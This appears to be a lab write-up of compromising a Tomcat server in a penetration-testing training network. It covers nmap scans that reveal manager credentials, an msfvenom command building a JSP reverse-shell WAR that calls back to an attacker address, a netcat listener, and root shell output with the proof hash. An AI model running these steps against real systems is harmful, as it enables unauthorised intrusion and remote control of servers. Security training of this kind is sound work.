Report

Report

1. SYN Stealth Scan all TCP ports using nmap We find 6 open ports.
![07fd772aa6460af762f39bc7c85f2c2c.png](81c67924b5fa40769ecc03a3eb14b471.png)


2. Run a deeper scan on the open ports which uses the aggressive and service detection switches, as well as the scriptw for default, safe, auth, and vuln.
`sudo nmap -A -p22,111,515,6787,8009,8080 -A -sV --script default,safe,auth,vuln --max-retries 4 10.11.1.209`
![8f98f1cbc0f232622c0f00aca8456ba5.png](2b7c30f04b254c438d7174161c11e204.png)
![8a7d686cc128092d851879855e514c37.png](9e2c2020546c4ff1bb24839663123b21.png)
![76752c1b6dbf32b14305c73174d0e82d.png](15285fe34247483b9dff07bbdf6cdbe9.png)
![e47a6d686ebd8db52c5c38a4161adb8c.png](02f03b431afe438e99da90e83cf22a91.png)
![e76102a77225ae8e2eb492eb4f723c11.png](63387bea96c74481a49ac45e0f023c4b.png)
![b6caff7a92ec6ad23765e9f965b48566.png](e9cf5d574f414923a5c44309bed7105e.png)
![3f31a50d6abe9d9c2e25f640a1fd746b.png](35f6edce2d8446b48a1ca09e819bd710.png)
![9c2a88501c8868c5bf29ba7d23b2cbb9.png](edea38f6c2d6467d9eae06c37e900d8c.png)
![b4d622ae4b68a126d783f332b2a2c13e.png](f88ee5ac07c84b04b46462c28f39999c.png)
![60199f1648a4a6a34331f50abd6b9c74.png](8101d1819d844af092b9977d270cf305.png)
![89268d7ed619d4447004b670b8ac855b.png](78e197357eec4fad82d80b748a444e82.png)
![2ae78513df3d6b323f80b2d2c1df916e.png](c69f4f93da7c435c8dcd2e633fe58da5.png)
![12c8604892e55beb0f71deeea9b4d4e6.png](88674172d846405589554be1d16ea112.png)

The most relevant piece of information is that we discovered credentials for the webserver at port 8080 tom:s3cret
![ab76e7d4d16a8fb5497a685b93e4fa4a.png](4d521b992dcf49538d659d9bbcf1447a.png)


3. Browse to the Apache Tomcat webpage. 
`http://10.11.1.209:8080/`
![2b9a8436561a1dc67640aaa2c80c4bf9.png](3779723eb10b45899f317d0efa589e86.png)


4. Click on the 'Manager/App' button and enter the credentials (tomcat:s3cret) we found from the nmap scan
![f89682d818f0d247f594d653f953c85d.png](2ef924f3b96c403796db9dfeae265380.png)


5. We are presented with the manager page. Note that we can deploy a WAR file
`http://10.11.1.209:8080/manager/html`
![9855a22c8b912fac553fd30d4cc566dc.png](4f04e7ff22184aa3b8ce8a0ca3a8c0ec.png)
![79da71adcac9db200f54134cab574a02.png](499359d033f1485fbd66c95f6ceace13.png)


6. Create a WAR shellcode file using msfvenom
`msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.119.214 lport=5678 -f war > shell.war`
![060a5c727f4c78b01804af3db7f65aaa.png](a6e22d5a65884c1189f4a85b5e904aa8.png)


7. Upload shell.war, then press the Deploy button 
![d06a1cea631a4c13824462b3716663ef.png](f2c4453a20a44b65a351d2719f14d4cf.png)


8. You'll see the shell listed in the Applications table
[http://10.11.1.209:8080/manager/html](http://10.11.1.209:8080/manager/html)
![9f75f0070d1eb3d729ea9beea6aa4250.png](e9a88faeb2c14764a3695b51e78056cb.png)


9. Start an nc listener
![01d70ee80f0b8698e03a55c935074f27.png](184ea04eb88e4bdab78825b4bf921ee3.png)


10. Execute the war file by clicking on the shell.war path listed in the Applications table. 
![77a5c2975b54ddd5a0236ac785258ca8.png](e775da5026df473495d24ad435371a30.png)
Notice the webpage becomes blank
![e4b969ce1d931ad1a36724d4dd33e024.png](4ed2f0b686a448c69dc26530ad66e4b7.png)


11. We have a shell on the nc listener. Check which user we are, then upgrade the shell.
`whoami`
`script /dev/null`
![2dd6610c1790c99d1a24025a8435c1f3.png](0998278d494a451193ec2e999f18f84c.png)


12. Display the ip address and proof.txt
`whoami`
`ifconfig -a`
`cat /root/proof.txt`

```plaintext
@kraken:~/$ whoami
whoami                                                                                
root                                                                                  
@kraken:~/$ ifconfig -a                                                               
ifconfig -a                                                                           
lo0: flags=2001000849<UP,LOOPBACK,RUNNING,MULTICAST,IPv4,VIRTUAL> mtu 8232 index 1    
        inet 127.0.0.1 netmask ff000000                                               
net0: flags=100001000843<UP,BROADCAST,RUNNING,MULTICAST,IPv4,PHYSRUNNING> mtu 1500 index 3                                                                                  
        inet 10.11.1.209 netmask ffff0000 broadcast 10.11.255.255                     
        ether 0:50:56:8a:c8:8a 
lo0: flags=2002000849<UP,LOOPBACK,RUNNING,MULTICAST,IPv6,VIRTUAL> mtu 8252 index 1
        inet6 ::1/128 
net0: flags=120002004841<UP,RUNNING,MULTICAST,DHCP,IPv6,PHYSRUNNING> mtu 1500 index 3
        inet6 fe80::250:56ff:fe8a:c88a/10 
        ether 0:50:56:8a:c8:8a 
@kraken:~/$ ls -la /root
ls -la /root
total 36
drwx------   3 root     root           7 Oct 29 05:29 .
drwxr-xr-x  24 root     sys           28 Oct 29 05:45 ..
-rw-------   1 root     root           1 Feb  3  2020 .bash_history
-rw-r--r--   1 root     root         159 Aug 17  2018 .bashrc
drwxr-xr-x   2 root     root           3 Nov  7  2019 .oracle_jre_usage
-rw-r--r--   1 root     root         568 Aug 17  2018 .profile
-rw-r--r--   1 root     root          33 Nov  7  2019 proof.txt
@kraken:~/$ cat /root/proof.txt
cat /root/proof.txt
657dd1ac919a586169dd8bf519d3429f
@kraken:~/$ 
```

![6824e77cdfb4061190b7c69ac4db1bc3.png](c5e5a4256a7a426cbd6efefdded33f3f.png)












